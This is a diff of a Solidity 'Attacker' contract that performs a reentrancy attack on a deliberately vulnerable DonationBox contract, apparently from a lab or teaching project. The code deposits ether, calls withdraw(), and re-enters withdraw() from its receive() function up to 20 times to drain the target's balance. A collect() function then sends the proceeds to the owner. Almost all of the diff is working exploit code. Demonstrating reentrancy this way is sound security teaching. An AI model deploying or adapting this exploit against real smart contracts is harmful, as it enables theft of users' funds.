@@ -1,54 +1,42 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-/// @title Attacker
-/// @notice Attacks DonationBox contracts by re-entering withdraw() in fallback
+import "./DonationBox_vulnerable.sol";
+
 contract Attacker {
-    address public target;
+    DonationBox_vulnerable public target;
     address public owner;
     uint256 public attackCount;
 
     constructor(address _target) {
-        target = _target;
+        target = DonationBox_vulnerable(payable(_target));
         owner = msg.sender;
     }
 
-    /// @notice Kick off the attack:
-    /// 1) deposit a small amount into the DonationBox as attacker
-    /// 2) call withdraw() to trigger the external transfer which invokes fallback -> reenter
+    /// deposit into target (via plain call to deposit()) then call withdraw()
     function attack() external payable {
-        require(msg.value >= 0.001 ether, "provide some ETH to deposit");
-        // Try deposit() first (for vulnerable contract), then donate() (for fixed contract)
-        (bool ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
-        if (!ok) {
-            (ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("donate()"));
-        }
-        require(ok, "deposit/donate failed");
+        require(msg.value > 0, "need deposit");
+        // deposit into target so attacker has a credited balance
+        target.deposit{value: msg.value}();
 
-        // Start the withdraw that will be re-entered via fallback
-        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
-        require(success, "withdraw failed");
-
-        // Keep funds in contract for testing purposes
-        // payable(owner).transfer(address(this).balance);
+        // attempt withdraw (reentrancy WILL work due to vulnerable pattern)
+        target.withdraw();
     }
 
-    /// @notice fallback is triggered when receiving Ether. Re-enter withdraw() while the target still has funds
     receive() external payable {
-        // stop after some iterations or if target has no balance left
-        uint256 targetBal = address(target).balance;
-
-        // Prevent infinite loop: limit re-entries (you can tune this)
-        if (targetBal > 0 && attackCount < 50) {
+        // Reentrancy attack: drain the entire contract balance
+        uint256 contractBalance = address(target).balance;
+        uint256 myBalance = target.balances(address(this));
+        
+        // Continue attacking while there's still money in the contract and we have a balance
+        if (contractBalance > 0 && myBalance > 0 && attackCount < 20) { // limit to prevent infinite gas
             attackCount++;
-            // Re-enter target to withdraw again before its state was set to zero
-            target.call(abi.encodeWithSignature("withdraw()"));
+            target.withdraw();
         }
     }
 
-    // Helper to retrieve any stuck funds
     function collect() external {
-        require(msg.sender == owner, "only owner");
+        require(msg.sender == owner);
         payable(owner).transfer(address(this).balance);
     }
 }
